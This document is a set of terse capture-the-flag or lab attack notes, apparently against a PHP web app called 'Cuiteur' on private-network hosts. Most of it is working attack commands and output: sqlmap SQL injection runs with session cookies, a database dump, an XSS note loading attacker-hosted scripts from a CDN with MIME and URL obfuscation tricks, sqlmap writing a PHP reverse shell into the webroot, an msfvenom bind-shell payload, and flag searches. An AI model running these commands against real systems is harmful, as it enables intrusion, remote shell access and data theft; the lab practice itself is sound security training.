# Foxtrot notes

- Cuiteur on <http://10.128.161.64>

```bash
sqlmap -u http://10.128.161.27/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=92u28hcv6a4tm07ivdck02in80" -dbs --text-only --forms 
```

```text
available databases [4]:                                                                                                                                                                   
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
```

- information_schema empty
- mysql:

```text
Database: mysql                                                                                                                                                                            
[30 tables]
+---------------------------+
| event                     |
| host                      |
| plugin                    |
| user                      |
| column_stats              |
| columns_priv              |
| db                        |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+
```
XSS na dodawaniu cuitów
https://stackoverflow.com/questions/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff
https://cdn.jsdelivr.net/gh/apultyn/hello-there@refs/heads/main/script.js
https://cdn.jsdelivr.net/gh/apultyn/hello-there@refs/heads/main/php-attack.php

Switch to cdn for mime type (with @), shortlink then obfuscate http via python url.replace('/', '\\')

sqlmap ma kurwa funkcje --os-shell

```bash
sqlmap -u http://10.128.161.64/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0s5l76j1jtso5e0eisj41ir2a2" --file-write php-reverse.php --file-dest='/var/www/html/php/php-reverse.php' --text-only --forms
```

```bash
msfvenom -p php/unix/cmd/bind_netcat > php-bind.php
```

```bash
grep -rs 'flag{' /var
```

```bash
find /var -name 'flag*'
```